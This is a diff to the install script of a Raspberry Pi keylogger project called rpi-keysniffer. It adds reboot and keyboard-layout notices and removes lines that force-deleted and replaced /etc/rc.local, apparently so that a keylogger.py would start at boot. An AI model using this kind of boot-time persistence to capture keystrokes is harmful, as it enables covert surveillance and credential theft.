@@ -31,6 +31,8 @@ echo -e "${BLUE}╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱�
 echo -e "${NC}\nWelcome to the rpi-keysniffer, press ENTER to continue."
 read
 echo -e "++++ necessary packets will be installed ++++"
+echo -e "++++ you will then have to change your keyboard layout +++"
+echo -e "++++ your pi will restart afterwards +++"
 
 while [[ $answer = False ]]; do
 read -p "Do you agree? [Y/n]: " YorN
@@ -38,13 +40,11 @@ if [[ $YorN = 'Y' ]];         #user agreed
 then
   requirements
   answer=True                 #add modules
-  sudo rm -rf /etc/rc.local        #replace rc.local
-  sudo cp rc.local /etc/rc.local
   sudo reboot
 elif [[ $YorN = 'n' ]];       #user didnt agree
 then
   answer=True
-  echo "You will have to add the /path/to/your/keylogger.py to /etc/rc.local manually."
+  echo "You will have to do everything manually then."
   echo "reboot afterwards"
 else                         #user didnt answer anything
   echo -e "\nPlease enter 'Y' or 'n'"
